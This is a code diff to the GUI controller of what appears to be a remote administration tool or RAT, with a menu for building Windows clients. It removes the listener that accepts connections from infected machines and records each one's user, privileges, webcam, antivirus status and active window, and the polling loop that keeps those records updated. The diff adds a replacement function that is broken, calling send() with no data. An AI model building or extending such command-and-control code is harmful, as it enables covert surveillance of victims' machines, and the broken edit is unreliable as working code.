@@ -242,8 +242,13 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.actionWindows_Client_PyInstaller.setText(_('MENU_BUILDER_PYINSTALLER'))
         # END BUILDER
 
-    # Start Listen for Servers
     def listen_start(self):
+        self.connection_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection_socket.connect((self.IPADDRESS, self.PORT))
+        self.connection_socket.send()
+
+    # Start Listen for Servers
+    def listen_start2(self):
         # update settings
         self.update_settings()
         self.portLabel.setText('[%s]' % str(self.PORT))
@@ -284,113 +289,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.actionStopListen_for_connections.setChecked(True)
 
         self.update_main_menu()
-
-    # listen for clients
-    # accept connections
-    def accept_connections(self):
-
-        # Initializing socket
-        self.c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        # telling the OS that you know what you're doing and you still want to bind to the same port
-        self.c.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-
-        # Bind address
-        self.c.bind((self.IPADDRESS, self.PORT))
-
-        # Start listen for connections
-        self.c.listen(self.MAXCONNECTIONS)
-
-        # Start Servers Check Thread
-        servers_check_start = threading.Thread(target=self.check_servers)
-        servers_check_start.setDaemon(True)
-        servers_check_start.start()
-
-        while self.acceptthreadState:
-            try:
-
-                # Try accept connection
-                self.sock, self.address = self.c.accept()
-            except:
-                continue
-
-            if not self.acceptthreadState:
-                return
-            if self.sock:
-
-                data = get(self.sock, 'myinfo', 'status')
-
-                if data == 'parent':
-
-                    data = get(self.sock, 'info', 'pcinfo')
-                    info = ast.literal_eval(data)
-
-                    # Set timeout None
-                    self.sock.settimeout(self.TIMEOUT)
-
-                    # Save connected socket
-                    socket_index = self.address[1]
-                    self.socks[socket_index] = {}
-                    self.socks[socket_index]['sock'] = self.sock
-                    self.socks[socket_index]['ip_address'] = self.address[0]
-                    self.socks[socket_index]['socket'] = self.address[1]
-                    self.socks[socket_index]['ostype'] = info['ostype']
-                    self.socks[socket_index]['protection'] = info['protection']
-                    self.socks[socket_index]['os'] = info['os']
-                    self.socks[socket_index]['user'] = info['user']
-                    self.socks[socket_index]['privileges'] = info['privileges']
-                    self.socks[socket_index]['inputdevice'] = info['inputdevice']
-                    self.socks[socket_index]['webcamdevice'] = info['webcamdevice']
-                    self.socks[socket_index]['activewindowtitle'] = info['activewindowtitle']
-
-                    get(self.sock, 'startChildSocket %s' % socket_index, 'streamingMode')
-
-                else:
-                    mode, index = data.split(' ')
-                    try:
-                        if int(index) in self.socks:
-                            i = int(index)
-
-                            if mode == 'streamingMode':
-                                data = get(self.sock, 'pcinfo', 'info')
-                                info = ast.literal_eval(data)
-
-                                self.streaming_socks[i] = {}
-                                self.streaming_socks[i]['sock'] = self.sock
-                                self.streaming_socks[i]['protection'] = info['protection']
-                                self.streaming_socks[i]['privileges'] = info['privileges']
-                                self.streaming_socks[i]['activewindowtitle'] = info['activewindowtitle']
-                                self.emit(SIGNAL('updateTable()'))
-
-                            self.send_run_signal(self.sock, mode)
-
-                    except ValueError:
-                        pass
-
-    # Servers Live Update
-    def check_servers(self):
-        while self.acceptthreadState:
-            try:
-                for i, k in self.streaming_socks.iteritems():
-                    sock = self.streaming_socks[i]['sock']
-                    try:
-                        data = get(sock, 'pcinfo', mode='pcinfo')
-                        info = ast.literal_eval(data)
-                        self.streaming_socks[i]['protection'] = info['protection']
-                        self.streaming_socks[i]['activewindowtitle'] = info['activewindowtitle']
-                        self.streaming_socks[i]['privileges'] = info['privileges']
-                    except (socket.error, SyntaxError):
-                        del self.socks[i]
-                        del self.streaming_socks[i]
-                        break
-                    except zlib.error:
-                        pass
-            except (RuntimeError, ValueError):
-                pass
-
-            self.emit(SIGNAL('updateTable()'))
-            self.emit(SIGNAL('updatePanel()'))
-
-            time.sleep(1)
 
     def get_preview(self):
         client = self.current_client()
